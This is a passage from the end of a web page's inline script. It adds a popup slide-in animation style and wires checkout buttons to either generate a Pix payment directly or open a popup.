           @keyframes popupSlideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        `;
        document.head.appendChild(style);

        document.querySelectorAll(CHECKOUT.triggerSelector).forEach(el => {
            el.addEventListener('click', (e) => {
                e.preventDefault();
                if (CHECKOUT.directPix) {
                    handleDirectPixGeneration(el);
                } else {
                    showPopup();
                }
            });
        });

    });
})();
</script>


</body></html>
